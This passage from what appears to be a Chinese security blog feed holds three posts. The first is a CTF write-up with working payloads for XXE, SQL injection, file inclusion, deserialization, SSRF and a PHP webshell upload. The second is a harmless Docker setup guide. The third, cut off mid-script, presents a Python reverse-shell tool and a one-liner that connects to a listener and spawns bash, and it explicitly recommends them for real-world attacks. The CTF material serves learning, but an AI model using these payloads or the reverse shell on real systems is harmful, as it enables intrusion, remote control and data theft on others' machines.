<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr=explode(<span class="string">" "</span>,$password);</span><br><span class="line">$c = intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$c];</span><br><span class="line"></span><br><span class="line">$c++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($file, $c);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>9.神秘的三叶草 </p>
<p>看了下源码，发现最后氛围两个字有超链接，打开Secret.php，根据要求发送如下请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">118.25</span><span class="number">.14</span><span class="number">.40</span>:<span class="number">8108</span></span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">referer: https://www.Sycsecret.com</span></span><br></pre></td></tr></table></figure>

<p>10.Jiang‘s Secret</p>
<p>查看源码发现一个href标签，又是一个超链接，不过是黑色的，页面ctrl+a可以看见，点开链接，发现一个302重定向action.php ，抓包看一下，提示secr3t.php，打开secr3t.php，是一个文件包含，说flag在flag.php，用php伪协议读一下，base64解码可得flag。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>11.性感黄阿姨，在线聊天 </p>
<p>题目提示xxe，php弱类型。XXE全称是——XML External Entity，也就是XML外部实体注入攻击。</p>
<p>打开题目是一个聊天界面，输入flag，它说只是guest用户，抓包看一下请求报文，发现传输的数据是json数据(JSON(JavaScript Object Notation)是一种轻量级的数据交换格式)name:”guest”，将name改为admin，看到要满足$name==md5($flag)，然后进行下一步，这里就要用到php弱类型，==是比较运算符号，不会检查条件式的表达式的类型，在比较字符串和整型时会将字符串转化为整型，如123adas123sda会变成123，省略字母后的字符.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="number">123</span>;</span><br><span class="line">$b=<span class="string">'123ads123dasd'</span>;</span><br><span class="line">var_dump($a==$b);	<span class="comment">//运行结果为bool(true)</span></span><br></pre></td></tr></table></figure>

<p>爆破name，name从0~xxxxx，name为数字，因为md5($flag)后为字符类型，里面含有数字，字母，和整型比较会除去字母后面字符只保留数字进行比较。爆出结果name为357，告诉了flag在<em>_f14g_Is_Here</em>.php，所以用xxe读取这个文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /message.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">148.70</span><span class="number">.59</span><span class="number">.198</span>:<span class="number">41257</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/xml</span></span><br><span class="line"><span class="comment">Content-Length: 201</span></span><br><span class="line"><span class="comment">Origin: http://148.70.59.198:41257</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://148.70.59.198:41257/</span></span><br><span class="line"><span class="comment">Cookie: td_cookie=195560425</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="comment">&lt;!ENTITY xxe SYSTEM</span></span><br><span class="line"><span class="comment"> "php://filter/read=convert.base64-encode/resource=_f14g_Is_Here_.php"&gt;</span></span><br><span class="line"><span class="comment">]&gt;</span></span><br><span class="line"><span class="comment">&lt;root&gt;</span></span><br><span class="line"><span class="comment">	&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span><br><span class="line"><span class="comment"> 	&lt;request&gt;flag&lt;/request&gt;</span></span><br><span class="line"><span class="comment">&lt;/root&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="1572445819157.png" alt="1572445819157"></p>
<p>文件内容以base64编码形式读出，解码可得flag。</p>
<p>12.你有特洛伊么</p>
<p>这个是文件上传，文件上传肯定做了些限制，慢慢看一下，发现是黑名单的验证，还验证了文件的内容，要包含图片格式，并且内容不能含有&lt;?，黑名单的验证其实比较好绕，用copy 1.jpg/b+1.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)做一个图片马，但是内容不能含有&lt;?，那么怎么表示这是php文件呢，查了一下发现还可以这样表示为php文件，但是这种表示方法在php7已经不适用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>接下来就是找一个不在黑名单，但可以解析的后缀名，发现.phtml没有过滤，且可以解析，上传该文件。</p>
<p><img src="1572446836898.png" alt="1572446836898"></p>
<p>最后读取文件，菜刀连接即可找到flag。</p>
<p>13.反序列化1.0</p>
<p>查看源码，发现反序列化参数可控，同时也看到了flag出现条件，所以简单传参一个序列化对象即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=O:<span class="number">7</span>:<span class="string">"Student"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"score"</span>;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>14.又来一只猫</p>
<p>这道题打开一看说源码备份，猜测有源码泄露，经测试发现存在www.zip，下载源码审计，这里贴一下源码，方便以后自己查看。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单介绍一下序列化和反序列化：序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。反序列化的漏洞大多是因为反序列化的参数可控与魔术方法相结合，通过精心构造的payload造成危害。</p>
<p>介绍几个常见的魔术方法：</p>
<p> __construct()：在对象创建时自动被调用；</p>
<p> __destruct()：在脚本运行结束时自动被调用；</p>
<p> __sleep()：在对象序列化的时候自动被调用；</p>
<p> __wakeup()：在反序列化为对象时自动被调用；</p>
<p> __toString()： 直接输出对象引用时自动被调用；</p>
<p>当成员属性数目大于实际数目时可绕过wakeup方法，最终payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>15.Eval evil code </p>
<p>这道题是考无参数执行命令，apache环境，可以使用getallheaders()函数，验证码的简单脚本。附一个链接    <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">传送门</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(key)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(key.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i))[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">'a074'</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最终请求报文</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">148.70</span><span class="number">.59</span><span class="number">.198</span>:<span class="number">34386</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 46</span></span><br><span class="line"><span class="comment">Origin: http://148.70.59.198:34386</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://148.70.59.198:34386/</span></span><br><span class="line"><span class="comment">Cookie: td_cookie=2346903105; PHPSESSID=741fb31b98aab1f28124c5035b048349</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">a: readfile("theflag.php");		//这里执行命令</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">payload=eval(end(getallheaders()));&amp;code=15836</span></span><br></pre></td></tr></table></figure>

<p>16.你有初恋吗</p>
<p>简单代码审计，post传以下参数即可 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">lover=syclove%<span class="number">2572</span></span><br></pre></td></tr></table></figure>

<p>17.hardsql</p>
<p>报错注入，过滤了or|and|substr|if|hex|mid|char|union，空格</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#	//数据库名</span></span><br><span class="line">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like'</span>geek<span class="string">'),0x7e),1)#	//表名</span></span><br><span class="line"><span class="string">username=admin&amp;password=admin'</span>^updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span><span class="string">'H4rDsq1'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#	//列名</span></span><br><span class="line">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1)#	//数据</span></span><br></pre></td></tr></table></figure>

<p>18.finalsql</p>
<p>时间盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#二分法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://118.25.14.40:8104/search.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">(i,j)</span>:</span></span><br><span class="line">	<span class="comment">#sql ="1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1"%(i,j)	#数据库名字</span></span><br><span class="line">	<span class="comment">#sql ="1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1"%(i,j)	#表名</span></span><br><span class="line">	<span class="comment">#sql ="1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1"%(i,j)	#列名</span></span><br><span class="line">	sql = <span class="string">"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span> % (i, j)	<span class="comment">#数据</span></span><br><span class="line">	data = &#123;<span class="string">"id"</span>:sql&#125;</span><br><span class="line">	r = requests.get(url,params=data)</span><br><span class="line">	<span class="comment">#print (r.url)</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		res = <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		res = <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> flag</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">		print(i,<span class="string">':'</span>)</span><br><span class="line">		low = <span class="number">31</span></span><br><span class="line">		high = <span class="number">127</span></span><br><span class="line">		<span class="keyword">while</span> low&lt;= high:</span><br><span class="line">			mid = (low+high)//<span class="number">2</span></span><br><span class="line">			res = payload(i,mid)</span><br><span class="line">			<span class="keyword">if</span> res:</span><br><span class="line">				low = mid+<span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid<span class="number">-1</span></span><br><span class="line">		f = int((low+high+<span class="number">1</span>))//<span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="comment">#print (f)</span></span><br><span class="line">		flag += chr(f)</span><br><span class="line">		print(flag)</span><br><span class="line">exp()</span><br><span class="line">print(<span class="string">'flag='</span>, flag)</span><br></pre></td></tr></table></figure>

<p>19.Leixiao’s blog</p>
<p>存储型xss，密保问题可以自定义修改payload，弹cookie回来</p>
<p>20.服务端检测系统</p>
<p>ssrf  CRLF注入 请求报文如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">148.70</span><span class="number">.59</span><span class="number">.198</span>:<span class="number">41256</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 156</span></span><br><span class="line"><span class="comment">Origin: http://148.70.59.198:41256</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://148.70.59.198:41256/</span></span><br><span class="line"><span class="comment">Cookie: td_cookie=3267711552; PHPSESSID=9h4mg0jrecc5of5lh1836hf7e3</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">url=http://127.0.0.1/&amp;method=POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: x</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 50</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">iwantflag=yes%26b=%s%</span></span><br></pre></td></tr></table></figure>

<p>21.rce me</p>
<p>无字符，数字拿shell，bypass disable_functions(利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so	//读取flag</span></span><br></pre></td></tr></table></figure>

<p>22.李三的代码审计2</p>
<p>考点xxe，phar的反序列化</p>
<p>23.你读懂了潇文清的网站了吗</p>
<p> xxe+phar的反序列化，输入框解析xml，可以用php://filter读文件，读取config.php，index.php，通过phar反序列化读取flag.php</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!ENTITY hacker SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"&gt; ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;hacker;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>docker简单学习及简单部署CTF题</title>
    <url>/2019/10/26/docker%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>1.什么是docker: Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 </p><a id="more"></a>
<p>2.为什么使用docker: docker有以下优点，更高效的利用系统资源，更快速的启动时间，一致的运行环境，持续交付和部署，更轻松的迁移，更轻松的维护和扩展，对比传统虚拟机总结</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody><tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘使用</td>
<td>一般为 <code>MB</code></td>
<td>一般为 <code>GB</code></td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
</tbody></table>
<p>话不多说，开始使用docker，下面都以root用户运行</p>
<p>1.安装docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//更新系统软件</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install </span><br><span class="line">apt-get install apt-transport-https</span><br><span class="line">apt-get install ca-certificates</span><br><span class="line">apt-get install curl</span><br><span class="line">apt-get install software-properties-common	//安装依赖包</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -	//添加官方密钥</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span>	//添加仓库</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//再次更新软件</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce	//安装docker，默认安装最新版</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v	//查看docker版本 出现Docker version 19.03.4, build 9013bf583a类似文字，则安装成功</span><br></pre></td></tr></table></figure>

<p>2.使用docker镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<p>添加以下代码，之后保存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">    <span class="string">"https://registry.docker-cn.com"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker	//重启docker服务</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:16.04	//拉取ubuntu:16.04镜像</span><br><span class="line">docker images	//查看本地已有镜像</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name ctf -p 8087:80 ubuntu:16.04	//使用ubuntu:16.04镜像，在后台以名字为ctf，映射端口为8087--&gt;80运行一个容器</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps	//查看正在运行的docker容器</span><br><span class="line">docker ps -a	//查看所有的docker容器</span><br><span class="line">docker start id		//运行docker容器</span><br><span class="line">docker stop id		//停止docker容器</span><br></pre></td></tr></table></figure>

<p>3.用容器部署CTF题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash	//进入docker容器shell，id一般取前三位即可</span><br></pre></td></tr></table></figure>

<p>进入容器后，搭建一个php7+nginx的简单服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update	//首先更新容器软件源，之后可以进行换源，换源后要再次更新软件源</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install nginx	//安装nginx</span><br><span class="line">apt-get install php7.2-fpm	//安装fpm扩展</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/sites-available</span><br><span class="line">vim default</span><br></pre></td></tr></table></figure>

<p>将里面内容作出以下修改，不清楚可以自行查询，这里不多讲</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">               include snippets/fastcgi-php.conf;</span><br><span class="line">       <span class="comment">#</span></span><br><span class="line">       <span class="comment">#       # With php7.0-cgi alone:</span></span><br><span class="line">       <span class="comment">#       fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">       <span class="comment">#       # With php7.0-fpm:</span></span><br><span class="line">               fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html	//默认网站根目录</span><br><span class="line">touch test.php</span><br><span class="line">vim test.php	//写入&lt;?php phpinfo();?&gt;，若出现phpinfo界面则成功了，可以自己搭建CTF题</span><br></pre></td></tr></table></figure>

<p>3.打包docker镜像给他人使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit id ctf:ctf	//将容器固化为镜像</span><br><span class="line">docker <span class="built_in">export</span> id &gt; ctf.tar	//将其打包成docker压缩包供复制到其他电脑上去使用</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load &lt; ctf.tar	//导入文件为docker镜像，若导入时出现这个问题open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory，说明这个tar包缺少docker所需要的一些json文件，不能直接导入</span><br><span class="line">cat ctf.tar | docker import - ctf	//可以这样导入</span><br><span class="line">docker images	//查看是否已导入</span><br></pre></td></tr></table></figure>

<p>以上就是docker简单的学习。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>linux反弹shell脚本的分析</title>
    <url>/2019/10/21/linux%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>linux的反弹shell脚本，实战，awd都可使用，代码来自原Google安全团队，在目标机运行下面python代码，nohup python shell.py (your ip) (your port) &amp; 在vps进行监听，nc -lvp 5555</p><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys,os,socket,pty</span><br><span class="line">shell = <span class="string">"/bin/bash"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'python reverse connector'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'usage: %s &lt;ip_addr&gt; &lt;port&gt;'</span> % name)         <span class="comment">#使用 输入ip地址 端口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit()                                      <span class="comment">#如果shell输入不是ip 端口 输出当前路径&lt;ip_addr&gt; &lt;port&gt; 正常退出</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class="comment">#创建TCP Socket</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>])))       <span 